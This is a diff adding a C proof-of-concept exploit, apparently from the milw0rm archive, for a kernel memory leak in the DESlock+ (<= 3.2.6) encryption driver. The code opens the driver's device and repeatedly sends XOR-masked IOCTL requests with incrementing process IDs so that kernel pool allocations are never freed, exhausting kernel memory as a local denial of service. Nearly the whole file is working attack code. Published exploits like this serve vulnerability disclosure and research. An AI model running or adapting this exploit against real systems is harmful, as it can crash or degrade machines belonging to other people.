@@ -1,0 +1,94 @@
+/* deslock-list-leak.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * DESlock+ <= 3.2.6 local kernel mem leak POC
+ * by mu-b - Fri 21 Dec 2007
+ *
+ * - Tested on: DLMFENC.sys 1.0.0.26
+ *
+ * kernel pool memory leak by continually allocating link list
+ * structures and never freeing them. This is not without a sense
+ * of irony in that each element must correspond to a unique
+ * ProcessID (arg[0]). Thus, adding a single element incurs a
+ * linear cost due to search :(. (O((n^2+n)/2) overall cost.)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <windows.h>
+
+#define DLMFENC_IOCTL 0x0FA4204C
+#define DLMFENC_FLAG  0xC001D00D
+
+#define ARG_SIZE(a)   ((a-(sizeof (int)*2))/sizeof (void *))
+
+struct ioctl_req {
+  int flag;
+  int req_num;
+  void *arg[ARG_SIZE(0x20)];
+};
+
+static void
+xor_mask_req (struct ioctl_req *req)
+{
+  DWORD i, pid;
+  PCHAR ptr;
+
+  pid = GetCurrentProcessId ();
+  for (i = 0, ptr = (PCHAR) req; i < 0x0C; i++, ptr++)
+    *ptr ^= pid;
+}
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  DWORD i, rlen;
+  HANDLE hFile;
+  BOOL result;
+
+  printf ("DESlock+ <= 3.2.6 local kernel mem leak PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  hFile = CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile == INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  memset (&req, 0, sizeof req);
+
+  for (i = 0; i <= UINT_MAX; i++)
+    {
+      req.flag = DLMFENC_FLAG;
+      req.req_num = 0x03;
+      req.arg[0] = (void *) i;
+
+      xor_mask_req (&req);
+      result = DeviceIoControl (hFile, DLMFENC_IOCTL,
+                                &req, sizeof req, &req, sizeof req, &rlen, 0);
+      if (!result)
+        {
+          fprintf (stderr, "* DeviceIoControl failed\n");
+          exit (EXIT_FAILURE);
+        }
+
+      if (!(i % 64))
+        printf ("%d..", i);
+    }
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-02-18]
